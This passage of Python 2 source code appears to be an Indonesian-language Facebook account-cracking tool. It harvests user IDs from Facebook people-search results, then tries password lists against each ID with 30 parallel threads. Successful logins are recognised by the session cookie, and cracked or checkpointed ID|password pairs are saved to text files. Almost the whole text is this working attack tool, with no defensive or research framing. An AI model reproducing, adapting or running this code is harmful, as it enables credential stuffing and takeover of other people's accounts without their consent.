														print '\x1b[96m[\x1b[92mBerhasil\x1b[96m]\x1b[97m ' + user + ' \x1b[96m|\x1b[97m ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[96m[\x1b[91mCekpoint\x1b[96m]\x1b[97m ' + user + ' \x1b[96m|\x1b[97m ' + pass6
															cek = open("out/banglo.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print
	print '\033[0m[\033[92m✓\033[0m] Selesai ...'
	print"\033[0m[\033[95m+\033[0m] Total \033[92mOK\033[0m/\033[94mCP\033[0m :\033[92m "+str(len(oks))+"\033[0m/\033[94m"+str(len(cekpoint))
	print("\033[0m[\033[93m+\033[0m] CP File tersimpan : out/usa.txt")
	raw_input("\n\033[96m[\033[0m Kembali \033[96m]")
	os.system('python2 vip.py')
	
	
import requests,bs4,sys,os
import requests,sys
from multiprocessing.pool import ThreadPool

class crack:
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		try:
			os.system("clear")
			print logo
			self.fl=open(raw_input("[~] Id file list : ")).read().splitlines()
		except Exception as e:
			print "!: %s"%e
			crack()
		print "[+] Contoh > Rio123,Rio12345"
		self.pwlist()
		
	def pwlist(self):
		self.pw=raw_input("[?] Password list : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			print "+: account found saved to: multiresult.txt"
			print "+: account checkpoint saved to: checkpoint.txt"
			ThreadPool(30).map(self.main,self.fl)
			exit("\n+: finished.")
		
	def main(self,fl):
		try:
			for i in self.pw:
				r=requests.Session()
				r.get("https://mbasic.facebook.com/login")
				r.headers.update({"User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36"})
				b=r.post("https://mbasic.facebook.com/login", data={"email":fl,"pass":i}).url
				if "c_user" in r.cookies.get_dict():
					self.ada.append("%s|%s"%(fl,i))
					open("multiresult.txt","a+").write("%s|%s\n"%(fl,i))
				if "checkpoint" in b:
					self.cp.append("%s|%s"%(fl,i))
					open("checkpoint.txt","a+").write("%s|%s\n"%(fl,i))
			self.ko+=1
			print "\r[Crack] %s/%s - found-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
			
def search(fl,r,b):
	open(fl,"a+")
	b=bs4.BeautifulSoup(r.get(b).text,"html.parser")
	for i in b.find_all("a",href=True):
		print "\r[GET]: %s id..."%(len(open(fl).read().splitlines())),;sys.stdout.flush()
		if "<img alt=" in str(i):
			if "home.php" in str(i["href"]):
				continue
			else:
				g=str(i["href"])
				if "profile.php" in g:
					d=bs4.re.findall("/profile\.php\?id=(.*?)&",g)
					if len (d) !=0:
						pk="".join(d)
						open(fl,"a+").write("%s\n"%(pk))
				else:
					d=bs4.re.findall("/(.*?)\?",g)
					if len(d) !=0:
						pk="".join(d)
						open(fl,"a+").write("%s\n"%(pk))
		if "Lihat Hasil Selanjutnya" in i.text:
			search(fl,r,i["href"])
	print "\n[+] finished."
				

def dumpfl():
	r=requests.Session()
	r.get("https://mbasic.facebook.com/login")
	r.headers.update({"User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36"})
	os.system('clear')
	print logo
	print "[×] Login Kembali Akun Facebook Anda [×] "
	r.post("https://mbasic.facebook.com/login", data={"email":raw_input("[€] Email/id : "),"pass":raw_input("[?] Password : ")}).url
	if "c_user" in r.cookies.get_dict():
		fl=raw_input("[?] Nama File : ")
		s=raw_input("[!] Nama Target : ")
		print ("[•] Contoh : Fajar Rizky")
		search(fl,r,"https://mbasic.facebook.com/search/people/?q="+s)

def cari():
	os.system("clear")
	print logo
	print "1. Dump id By Search Name"
	print "2. Crack"
	print "0. Kembali\n"
	r=raw_input("︻デ═一▸ : ")
	if r=="":
		os.system("clear")
	elif r =="1":
		dumpfl()
	elif r=="2":
		crack()
	elif r=="0":
		menu()
	else:
		print "!: wrong input"
		cari()


if __name__ == '__main__':
	menu()
	login()
